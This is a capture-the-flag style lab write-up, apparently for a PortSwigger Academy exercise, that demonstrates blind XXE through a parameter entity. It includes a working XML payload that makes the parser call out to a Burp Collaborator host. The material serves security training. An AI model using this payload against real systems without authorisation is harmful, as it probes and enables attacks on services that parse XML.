# Blind XXE — Out-of-Band Interaction via Parameter Entities

This lab's "Check stock" feature parses XML input, never reflects unexpected values back, and actively blocks requests that contain regular external entities.

**Goal:** Use a parameter entity instead to make the XML parser perform a DNS lookup and HTTP request against Burp Collaborator.

Note: The Academy's firewall stops the lab environment from reaching arbitrary external systems, so Burp Collaborator's own public server must be used for this to work.

---

**Reference:** https://portswigger.net/web-security/xxe/blind

---

Lab URL generated: https://0a8300cf04a26be4802b0864005700e8.web-security-academy.net/

Original request:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

Following the reference material's pattern, we want to add something like:

``` 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe; ]>
```

This gives us the payload to test:

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com"> %xxe; ]>		
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

<img width="928" height="448" alt="1" src="https://github.com/user-attachments/assets/fac052a6-401c-43aa-8684-483b0cc6b4c3" />


This produces incoming requests in Burp Collaborator:

<img width="891" height="99" alt="2" src="https://github.com/user-attachments/assets/3debc6f4-d74c-4cfc-a523-69a34b9e984a" />

